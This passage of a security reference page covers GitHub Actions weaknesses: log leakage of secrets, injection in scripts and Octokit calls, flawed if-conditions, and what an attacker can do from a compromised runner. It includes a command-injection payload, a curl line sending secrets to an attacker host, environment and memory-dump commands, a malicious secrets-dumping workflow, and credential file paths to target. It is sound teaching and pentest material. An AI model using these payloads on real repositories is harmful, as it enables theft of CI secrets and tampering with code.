New sensitive data may appear during execution of composite actions, such as temporary tokens, retrieved data, etc. Github Actions allow developers to mask this data in logs using [add-mask workflow command](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log). So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs:

```yaml
name: 'API requester'
description: 'Send requests to API with curl'
inputs:
  token:
    description: 'Token'
    required: true

runs:
  using: "composite"
  steps:
    - run: |
        BASIC_AUTH=$(echo -n "token:${{ inputs.TOKEN }}" | base64)
        curl -v -H "Authorization: Basic $BASIC_AUTH" https://api.website.com
      shell: bash
```

## JavaScript action

[JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action) is used to execute a Node.js code.

{% hint style="info" %}
[actions/github-script](https://github.com/actions/github-script) allows executing of JavaScript code as well and all vulnerabilities described here apply to `github-script`
{% endhint %}

{% hint style="info" %}
Since a JavaScript action is a Node.js application, it can be vulnerable to common Node.js weaknesses such as code/command injection, prototype pollution, etc.
{% endhint %}

### Command injection

Github Actions toolkit provides the [@actions/exec](https://github.com/actions/toolkit/tree/main/packages/exec) package to execute shell commands:

```javascript
const exec = require('@actions/exec');
await exec.exec('node index.js');
```

[github-script](https://github.com/actions/github-script) provides the [exec](https://github.com/actions/github-script#actionsgithub-script) object to access the exec package:

```yaml
- uses: actions/github-script@v6
  with:
    script: |
      await exec.exec('node index.js');
```

If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), github context, etc.) is passed directly to the `exec` it can lead to command or argument injection.

### Disclosure of sensitive data

New sensitive data may appear during a JavaScript action execution, such as temporary tokens, retrieved data, etc. In order for such sensitive data to be masked in the logs, the [@actions/core](https://github.com/actions/toolkit/tree/main/packages/core) provides the [setSecret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) method. `code.setSecret` registers the data in the runner to ensure it is masked in the logs. Therefore, if the `code.setSecret` is not used sensitive data can leak to workflow run logs.

For instance, the sample below will leak `api_token` to logs if the [echoing](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#echoing-command-outputs) or [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled:

```javascript
const core = require("@actions/core");
let api_token = client.get_token();
// the token will not be masked in the logs
core.setOutput("api_token", token);
```

```
// workflow run log
::set-output name=actions_runtime_token::tETDURnbqsGTLtLB
```

### Github context

JavaScript actions are able to access the [GitHub context](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context) via [@actions/github](https://github.com/actions/toolkit/tree/main/packages/github):

```javascript
const github = require("@actions/github");
const context = github.context;
console.log(context.repo.repo);
```

[github-script](https://github.com/actions/github-script) provides the [context](https://github.com/actions/github-script#actionsgithub-script) object to access the Github context:

```yaml
- uses: actions/github-script@v6
  with:
    script: |
      console.log(context.repo.repo)
```

The next variables in the Github context can be controlled by a user who opens a PR from a forked repo, creates an issue, submits a comment to a PR, and etc.:

- `context.payload.pull_request.title`
- `context.payload.pull_request.body`
- `context.payload.pull_request.head.ref`
- `context.payload.pull_request.head.label`
- `context.payload.pull_request.head.repo.default_branch`
- `context.payload.pull_request.head.repo.description`
- `context.payload.pull_request.head.repo.homepage`
- `context.payload.issue.body`
- `context.payload.issue.title`
- `context.payload.comment.body`
- `context.payload.discussion.body`
- `context.payload.discussion.title`

These variables can be used as a source to pass arbitrary data to vulnerable code.

### Octokit GraphQL API injection

[@actions/github](https://github.com/actions/toolkit/tree/main/packages/github) allows making GraphQL requests (check https://github.com/octokit/graphql.js for the API):

```javascript
const github = require('@actions/github');
const octokit = github.getOctokit(myToken);
const result = await octokit.graphql(query, variables);
```

[github-script](https://github.com/actions/github-script) provides the [github](https://github.com/actions/github-script#actionsgithub-script) object to access the `octokit` client:

```yaml
- uses: actions/github-script@v6
  with:
    script: |
      const result = await github.graphql(query, variables);
```

If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), github context, etc.) is passed directly to the `query` it can lead to an injection to GraphQL request.

{% hint style="info" %}
There is [octokit/graphql-action](https://github.com/octokit/graphql-action) which can be vulnerable to the injection as well, check [Misuse of contexts](#misuse-of-contexts)
{% endhint %}

### Octokit REST API injection

[@actions/github](https://github.com/actions/toolkit/tree/main/packages/github) allows making requests to REST API (check https://octokit.github.io/rest.js for the API):

```javascript
const github = require('@actions/github');
const octokit = github.getOctokit(myToken);
const { data: pullRequest } = await octokit.rest.pulls.get({
  owner: 'octokit',
  repo: 'rest.js',
  pull_number: 123,
  mediaType: {
    format: 'diff'
  }
});
```

[github-script](https://github.com/actions/github-script) provides the [github](https://github.com/actions/github-script#actionsgithub-script) object to access the `octokit` client:

```yaml
- uses: actions/github-script@v6
  with:
    script: |
      const { data: pullRequest } = await github.rest.pulls.get({
        owner: 'octokit',
        repo: 'rest.js',
        pull_number: 123,
        mediaType: {
          format: 'diff'
        }
      });
```

If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), github context, etc.) is passed directly to the next methods it can lead to an injection to requests to REST API:

- [octokit.request()](https://octokit.github.io/rest.js/v18#custom-requests)
- [octokit.paginate()](https://octokit.github.io/rest.js/v18#pagination)
- [octokit.registerEndpoints()](https://octokit.github.io/rest.js/v18#custom-endpoint-methods)

{% hint style="info" %}
There is [octokit/request-action](https://github.com/octokit/request-action) which can be vulnerable to the injection as well, check [Misuse of contexts](#misuse-of-contexts)
{% endhint %}

## Docker action

[Docker container action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action) is used to run a Docker container and execute a code in Docker.

{% hint style="info" %}
Since a Docker container action runs scripts written on different languages (bash, python, go, etc.), they can also be vulnerable to common weaknesses like code/command injection, path traversal, and etc.
{% endhint %}

### Disclosure of sensitive data

New sensitive data may appear during execution of Docker container actions, such as temporary tokens, retrieved data, etc. Github Actions allow developers to mask this data in logs using [add-mask workflow command](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log). So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs:

```yaml
name: 'API requester'
description: 'Send requests to API with curl'
inputs:
  token:
    description: 'Token'
    required: true

runs:
  using: "docker"
  image: "Dockerfile"
```

```bash
# entrypoint.sh
#!/bin/sh

TOKEN=$1
BASIC_AUTH=$(echo -n "token:${TOKEN}" | base64)
curl -v -H "AUTH: ${BASIC_AUTH}" https://api.website.com
```

### Using a malicious docker image

In addition to a local `Dockerfile` in a repositoy, you can use third-party Docker images from a registry. Therefore, these Docker images may be vulnerable, causing the container to be compromised.

{% hint style="info" %}
The same is applicable for [job](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idcontainer) and [service](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idservices) containers
{% endhint %}

References:
- [GitHub Docs: About service containers](https://docs.github.com/en/actions/using-containerized-services/about-service-containers)

### Sensitive mounts

Github runner passes part of the environment variables and mounts volumes when running a Docker container:

```bash
/usr/bin/docker run \
    --name b31b05063130cf75cab0a728bd52f90782d_ea3c3b \
    --label 294b31 \
    --workdir /github/workspace \
    --rm \
    -e HOME -e GITHUB_JOB -e GITHUB_REF -e GITHUB_SHA -e GITHUB_REPOSITORY -e GITHUB_REPOSITORY_OWNER -e GITHUB_RUN_ID -e GITHUB_RUN_NUMBER -e GITHUB_RETENTION_DAYS -e GITHUB_RUN_ATTEMPT -e GITHUB_ACTOR -e GITHUB_WORKFLOW -e GITHUB_HEAD_REF -e GITHUB_BASE_REF -e GITHUB_EVENT_NAME -e GITHUB_SERVER_URL -e GITHUB_API_URL -e GITHUB_GRAPHQL_URL -e GITHUB_REF_NAME -e GITHUB_REF_PROTECTED -e GITHUB_REF_TYPE -e GITHUB_WORKSPACE -e GITHUB_ACTION -e GITHUB_EVENT_PATH -e GITHUB_ACTION_REPOSITORY -e GITHUB_ACTION_REF -e GITHUB_PATH -e GITHUB_ENV -e GITHUB_STEP_SUMMARY -e RUNNER_DEBUG -e RUNNER_OS -e RUNNER_ARCH -e RUNNER_NAME -e RUNNER_TOOL_CACHE -e RUNNER_TEMP -e RUNNER_WORKSPACE -e ACTIONS_RUNTIME_URL -e ACTIONS_RUNTIME_TOKEN -e ACTIONS_CACHE_URL -e GITHUB_ACTIONS=true -e CI=true \
    -v "/var/run/docker.sock":"/var/run/docker.sock" -v "/home/runner/work/_temp/_github_home":"/github/home" -v "/home/runner/work/_temp/_github_workflow":"/github/workflow" -v "/home/runner/work/_temp/_runner_file_commands":"/github/file_commands" -v "/home/runner/work/actions/actions":"/github/workspace" \
    294b31:b05063130cf75cab0a728bd52f90782d
```

Here it is worth paying attention to at least the following things:

1. Exposed Docker socket at `/var/run/docker.sock`. It allows you to escape from the container. Please, check out [Container: Escaping - Exposed Docker Socket](/Container/Escaping/exposed-docker-socket.md)
2. `/github/workspace` is a folder with a repository content. For example, you can grab a repository token from `/github/workspace/.git/config` file, check out "[Exfiltrating data from a runner](#exfiltrating-data-from-a-runner)" section.

# Reusing vulnerable workflows

Github Actions allows you to make workflows [reusable](https://docs.github.com/en/actions/using-workflows/reusing-workflows) using the [workflow_call](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_call) event. It allows calling a reusable workflow from another workflow by anyone who has access to this workflow:

```yaml
jobs:
  call-workflow-passing-data:
    # third-party reusable workflow
    uses: octo-org/example-repo/.github/workflows/reusable-workflow.yml@main
    # or you can use a local reusable workflow
    # uses: .github/workflows/reusable-workflow.yml
    with:
      username: mona
    secrets:
      envPAT: ${{ secrets.envPAT }}
```

```yaml
# reusable workflow
# octo-org/example-repo/.github/workflows/reusable-workflow.yml
on:
  workflow_call:
    inputs:
      username:
        required: true
        type: string
    secrets:
      envPAT:
        required: true

jobs:
  main:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -H "Authorization: ${{ inputs.envPAT }}" "https://api.website.com/api/v1/${{ inputs.username }}"
```

Reusable workflows are very similar to third-party actions. They are run in the context of a called workflow and allow defining [inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs). Therefore, reusable workflows may misuse user-controlled input or context variables, which could lead to the same vulnerabilities that are described for workflows and third-party actions in this page.

The reusable workflow from the snippet above is vulnerable to command injection. If the `username` input variable will be controlled by an attacker, they can leak `envPAT` using the following payload as `username`:

```
"; cat /home/runner/work/_temp/$(xxd -r -p <<< 2a) | base64 -w0 | base64 -w0;#
```

Another example is the following workflow which checkouts a code from an incoming PR and runs `npm install` against it:

```yml
on:
  workflow_call:

jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
        # check out incoming PR code
        - uses: actions/checkout@v2
        with:
            ref: refs/pull/${{ github.event.pull_request.number }}/merge
        - uses: actions/setup-node@v1
        # potentially untrusted code is being run during npm install or npm build
        # as the build scripts and referenced packages are controlled by the author of the PR
        - run: |
            npm install
            npm build
```

References:
- [GitHub Docs: Reusing workflows](https://docs.github.com/en/actions/learn-github-actions/reusing-workflows)

# Vulnerable if-conditions

`if` condition is used in a workflow file to determine whether a step should run. When an `if` conditional is `true`, the step will run. It can be useful from security perspective as well. For example, you can use the following `if` statement to allow only a PR from the base repository:

```yml
name: PR workflow

on: pull_request

jobs:
  test-job:
    runs-on: ubuntu-latest
    if: ${{ github.event.pull_request.head.repo.full_name == github.repository }}
    steps:
      - name: Do some work
        run: ...
```

However, these `if` conditions can be vulnerable and lead not to the behavior that is originally expected.

## Incorrect comparison

[Expressions](https://docs.github.com/en/actions/learn-github-actions/expressions) implement insensitive comparison that can be misused during protection implementation. For example, the following `if` condition will be `true`:

```yaml
jobs:
  test-job:
    if: 'test' == 'TEST'
    steps:
      - name: Do some work
        run: ...
```

Github provides the `contains()` function that can be used in an if-condition incorrectly. For example in the following example, an author has restricted the execution of the step to only bots using `contains()`:

```yaml
jobs:
  test-job:
    if: contains(github.actor, '[bot]')
    steps:
      - name: Do some work
        run: ...
```

However, this condition can be easily met by creating your own bot.

## Labels on PRs

One approach to control the workflow execution is to use labels on PRs. This is possible because a label on a PR can only be set by a project member. As a result, it allows running a workflow only after a project member has reviewed a PR and set an appropriate label:

```yaml
name: Vulnerable workflow

on: pull_request_target

jobs:
  test-job:
    runs-on: ubuntu-latest
    if: (github.event.action == 'labeled' && github.event.label.name == 'approved') || (github.event.action != 'labeled' && contains(github.event.pull_request.labels.*.name, 'approved'))
    steps:
      - name: Do some work
        run: ...
```

If a workflow uses [pull_request](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request) or [pull_request_target](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) events with `synchronize` action type, it will be triggered when the head repository is updated. Since new changes to a PR do not remove labels, you can bypass the `if` condition in the example above like this:

1. Create a PR with valid changes.
2. Wait for the label to be set.
3. Update the PR with malicious code.
4. The updates will trigger the workflow.

## Misusing context variables

Using wrong context variables can cause `if` condition to always be `true` or `false` regardless of the situation. For example, the following `if` condition uses `github.event.pull_request.base.repo.full_name` instead of `github.event.pull_request.head.repo.full_name` variable to ignore pull requests from forks:

```yml
name: Vulnerable workflow

on: pull_request

jobs:
  test-job:
    runs-on: ubuntu-latest
    # check base repo instead of head one
    # this condition is always true
    if: ${{ github.event.pull_request.base.repo.full_name == github.repository }}
    steps:
      - name: Do some work
        run: ...
```

However, this condition will be always `true`. The same behavior will be achieved if `github.repository` is used to compare against the repo name:

```yml
name: Vulnerable workflow

on: pull_request

jobs:
  test-job:
    runs-on: ubuntu-latest
    # github.repository contains the full repo name
    # this condition is always true
    if: github.repository == 'namespace/project'
    steps:
      - name: Do some work
        run: ...
```

## Skipping mandatory checks

A workflow can implement various types of checks during running. For example, it can check if an actor is a member of an organization or if they have write permissions for the current repo. This can be done using third-party actions or a custom check using the Github API. However, not all such actions interrupt execution if a check fails, some of them return a boolean value for subsequent verification. For instance, the following snippet shows a check for the presence of an actor in an org team:

```yaml
- name: Fetch team member list
  uses: tspascoal/get-user-teams-membership@v1
  with: 
    username: ${{ github.actor }}
    organization: <ORG>
    team: <TEAM>
    GITHUB_TOKEN: ${{ secrets.READ_ORG_SECRET_JSVD }}
- name: Is user not a team member?
  if: ${{ steps.checkUserMember.outputs.isTeamMember == 'false' }}
  run: exit 1
```

Nevertheless, the snippet above is vulnerable because there is no the `id:` field for `Fetch team member list` step. As a result, `${{ steps.checkUserMember.outputs.isTeamMember == 'false' }}` is always false. So, the fixed version looks like this:

```yaml
- name: Fetch team member list
  # id filed was missed in the vulnerable sample
  id: checkUserMember
  uses: tspascoal/get-user-teams-membership@v1
  with: 
    username: ${{ github.actor }}
    organization: <ORG>
    team: <TEAM>
    GITHUB_TOKEN: ${{ secrets.READ_ORG_SECRET_JSVD }}
- name: Is user not a team member?
  if: ${{ steps.checkUserMember.outputs.isTeamMember == 'false' }}
  run: exit 1
```

## Unclaimed or incorrect usernames

If you see something like this:

```yaml
if: |
  github.actor == 'user1' || github.actor == 'user2' || github.actor == 'user3'
```

Make sure all these users exist as they may have already been deleted or misspelled.

# Potential impact of a compromised runner workflow

## Accessing secrets

Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` or `push`, where you could attempt to steal repository secrets or use the write permission of the job's [GITHUB_TOKEN](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#about-the-github_token-secret).

{% hint style="info" %}
`GITHUB_TOKEN` is the same token that Github Apps use. For information about the API endpoints GitHub Apps can access with each permission, check out "[GitHub App Permissions](https://docs.github.com/en/rest/reference/permissions-required-for-github-apps)" page. You can find the permissions for `GITHUB_TOKEN` in a workflow log on the `Set up job` step:

![](img/github-token-permissions.png)
{% endhint %}

References:
- [GitHub Docs: Environment variables - Default environment variables](https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables)
- [GitHub Docs: Security hardening - Potential impact of a compromised runner](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#accessing-secrets)

### Environment variables

If a secret is passed to an environment variable, you can directly access it in the following ways:

```bash
# you can intentionally sent secrets to the logs with echo command
$ echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};
# or using base64
$ echo "${SOME_SECRET}" | base64 -w0 | base64 -w0
# you can exfiltrate secrets with curl command
$ curl "https://attacker-website.com/?secret=${SOME_SECRET}"
# use printenv to dump environament variables
$ printenv | base64 -w0 
# same as printenv but via proc fs
$ cat /proc/self/environ | base64 -w0
```

### Shell scripts

If a secret is used directly in an expression `${{ }}` in the `run:` block, like:
    
```yml
- run: |
    publisher ${{ secrets.PUBLISH_KEY }}
  shell: bash
```

The generated shell script will be stored on the disk in the `/home/runner/work/_temp/` folder. This script contains the secret in plain text, because Github Runner evaluates the expressions inside of `${{ }}` and substitutes with the resulting values before running the script in the `run:` block. Therefore, the secret can be accessed with the following command:

```bash
$ cat /home/runner/work/_temp/$(xxd -r -p <<< 2a) | base64 -w0 | base64 -w0
```

Note that this behavior is independent of [shell settings](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsshell).

### Rewriting third-party actions

If you have an arbitrary command execution in front of a third-party action that handles secrets:

```yaml
- run: |
    <COMMAND_INJECTION_HERE>
- uses: fakeaction/publish@v3
  with:
    key: ${{ secrets.PUBLISH_KEY }}
```

You can steal secrets by rewriting third party action code. Github Runner checks out all third-party action repositories during the "Set up" step ans saves them to the `/home/runner/work/_actions/` folder. For example, `fakeaction/publish@v3` will be checked out to the `/home/runner/work/_actions/fakeaction/publish/v3/` folder. Therefore, you can rewrite a third-party action with a malicious one using command injection to access secrets.

The easiest way is to override the `action.yml` file with a composite action that leaks secrets:

```yaml
name: 'Publish'
description: 'Fake publish action'
inputs:
  key:
    description: 'Publish key'
    required: true

runs:
  using: "composite"
  steps:
    - run: echo "${{ inputs.key }}" | base64 -w 0 | base64 -w 0
      shell: bash
```

### Third-party actions leak secrets

Third-party actions may use secrets obtained from the arguments inappropriately and leak them the workflow log or save them to disk.

```yaml
# save the PUBLISH_KEY to the .fakeaction file
- uses: fakeaction/publish@v3
  with:
    key: ${{ secrets.PUBLISH_KEY }}
# read PUBLISH_KEY from .fakeaction using a command injection
# like: cat .fakeaction | base64 -w 0 | base64 -w 0
- run: |
    <COMMAND_INJECTION_HERE>
```

Check out the "[Exfiltrating data from a runner](#exfiltrating-data-from-a-runner)" section.

### Leaking all secrets by adding a malicious workflow

Basically non-default branches have no any branch protection rules. If you have access to `GITHUB_TOKEN` with the `pull_requests:write` scope, you can add an arbitrary workflow to a non-default branch. Since the `pull_request_target` workflow in non-default branches can be triggered by a user, you are able to leak all repo and org secrets using the following steps:

1. Fork the target repo
1. Add a malicious `pull_request_target` workflow:

    ```yaml
    name: Malicious workflow
    on: pull_request_target
    env:
      secrets: ${{ toJSON(secrets) }}
    jobs:
      one:
        runs-on: ubuntu-latest
        steps:
          - run: echo $secrets | base64 -w0 | base64 -w0
    ```

1. Create a PR to a non-default branch
1. Merge the PR using `GITHUB_TOKEN` with `pull_requests:write` scope:

    ```bash
    curl -X PUT -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" https://api.github.com/repos/<OWNER>/<REPO>/pulls/<PR_NUMBER>/merge
    ```

1. After merging PR open a PR to the non-default branch from the forked repo.
1. Wait for the malicious workflow to complete; It will leak all secrets to the logs.

If `GITHUB_TOKEN` has the `contents:write` scope, you can create your own non-default branch using the following API request:

```bash
curl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" https://api.github.com/repos/OWNER/REPO/git/refs -d '{"ref":"refs/heads/featureA","sha":"aa218f56b14c9653891f9e74264a383fa43fefbd"}'
```

## Approving PRs

{% hint style="info" %}

[As of May 2022](https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/), create and approve pull requests by GitHub Actions is disabled for all new repositories and organizations by default. Please, check out [GitHub Docs: Preventing GitHub Actions from creating or approving pull requests](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)
{% endhint %}

You can grant write permissions on the pull requests API endpoint and use the API to approve a PR. It can be used to bypass branch protection rules, when a main branch requires 1 approvals and does not requre review from code owners.

![](img/branch-protection-rule.png)

For instance, if you can write to non-main branches of a repository, you can bypass the protection using the next steps:

1. Create a branch and add the following workflow:

    {% embed url="https://gist.github.com/omer-cider/83692af5ff4fa4542bd2be44031e6035" %}

2. Create a pull request
3. Pull request will require review
4. Once the action is complete, github-actions bot will approve the changes
5. You can merge the changes to the main branch

{% hint style="info" %}
Note that if you have access to `GITHUB_TOKEN` with [permission on "pull_request"](https://docs.github.com/en/rest/overview/permissions-required-for-github-apps#permission-on-pull-requests) you can also approve a PR without having write permissions for a target repository.
{% endhint %}

- [Writeup: Bypassing required reviews using GitHub Actions](https://medium.com/cider-sec/bypassing-required-reviews-using-github-actions-6e1b29135cc7)

## Exfiltrating data from a runner

An attacker can exfiltrate any stored secrets or other data from a runner. Actions and scripts may store sensitive data on the disk:

| Source | Path | Description |
| --- | --- | --- |
| [actions/checkout](https://github.com/actions/checkout) | `.git/config` | `actions/checkout` action by default stores the repository token in a `.git/config` file unless the `persist-credentials: false` argument is set |
| [atlassian/gajira-login](https://github.com/atlassian/gajira-login) | `$HOME/.jira.d/credentials` | `gajira-login` action [stores](https://github.com/atlassian/gajira-login/blob/90a599561baaf8c05b080645ed73db7391c246ed/index.js#L50) the credentials in `credentials` |
| [Azure/login](https://github.com/Azure/login) | `$HOME/.azure` | `Azure/login` action by default use the Azure CLI for login, that stores the credentials in `$HOME/.azure` folder |
| [aws-actions/amazon-ecr-login](https://github.com/aws-actions/amazon-ecr-login) | `$HOME/.docker/config.json` | `aws-actions/amazon-ecr-login` [invokes](https://github.com/aws-actions/amazon-ecr-login/blob/4831715c8c81dbf2ae795f9e285de2a9ee1150b4/index.js#L48) `docker-login` which [writes](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) by default credentials in `.docker/config.json` file |
| [docker/login-action](https://github.com/docker/login-action) | `$HOME/.docker/config.json` | `docker/login-action` [invokes](https://github.com/docker/login-action/blob/3a136a8631bbc4ca05cc2f33d3a19059e9255bae/src/main.ts#L11) `docker-login` which [writes](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) by default credentials in `.docker/config.json` file |
| [docker login](https://docs.docker.com/engine/reference/commandline/login/) | `$HOME/.docker/config.json` | `docker-login` [stores](https://docs.docker.com/engine/reference/commandline/login/#credentials-store) credentials in `.docker/config.json` file |
| [google-github-actions/auth](https://github.com/google-github-actions/auth) | `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` | [google-github-actions/auth](https://github.com/google-github-actions/auth) action by default [stores](https://github.com/google-github-actions/auth/blob/b258a9f230b36c9fa86dfaa43d1906bd76399edb/src/client/credentials_json_client.ts#127) the credentials in a `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` file unless the `create_credentials_file: false` argument is set |
| [hashicorp/setup-terraform](https://github.com/hashicorp/setup-terraform) | `$HOME/.terraformrc` | `hashicorp/setup-terraform` action by default [stores](https://github.com/hashicorp/setup-terraform/blob/8b4c280fc8c755f3640ce104b5ba443608256909/lib/setup-terraform.js#L104) credentials in a `.terraformrc` file |

Any secrets that are used by a workflow are passed to the Github Runner at startup; therefore secrets are placed in the process's memory. Although GitHub Actions scrub secrets from memory that are not referenced in the workflow or in an included Action, `GITHUB_TOKEN` is always passed to the Runner. You can try to exfiltrate secrets from the memory dump. For example the following script dumps the memeory and grep the `GITHUB_TOKEN`:

{% embed url="https://gist.github.com/nikitastupin/30e525b776c409e03c2d6f328f254965" %}

References:
- [GitHub Docs: Security hardening - Potential impact of a compromised runner](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#exfiltrating-data-from-a-runner)

## Modifying the contents of a repository

An attacker can use the GitHub API to [modify repository content](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token).

References:
- [GitHub Docs: Security hardening - Potential impact of a compromised runner](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#modifying-the-contents-of-a-repository)

## Access cloud services via OIDC

If a vulnerable workflow has the `id-token:write` scope you can request the OIDC JWT ID token to access cloud resources.

References:

- [Github Docs: Security hardening your deployments - About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [Deploy without credentials with GitHub Actions and OIDC](https://blog.alexellis.io/deploy-without-credentials-using-oidc-and-github-actions/)
